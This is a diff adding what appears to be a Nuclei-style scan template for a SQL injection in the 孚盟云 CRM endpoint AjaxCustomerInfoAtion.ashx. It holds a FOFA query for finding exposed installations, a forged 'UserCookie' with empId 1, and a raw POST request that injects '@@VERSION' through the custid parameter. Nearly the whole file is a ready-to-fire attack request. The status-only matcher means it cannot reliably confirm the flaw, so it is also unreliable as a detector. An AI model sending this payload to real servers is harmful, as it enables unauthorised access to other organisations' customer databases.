@@ -1,0 +1,28 @@
+id: poc-pf4q2u7522hpe6k4
+info:
+  name: 孚盟云CRM AjaxCustomerInfoAtion.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pf4q2u7522hpe6k4'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pf4q2u7522hpe6k4
+    fofa: app="孚盟软件-孚盟云"
+http:
+- raw:
+  - 'POST /m/Dingding/Ajax/AjaxCustomerInfoAtion.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: UserCookie={"empId":"1"}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    method=getTitle&custid=''-1/@@VERSION--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
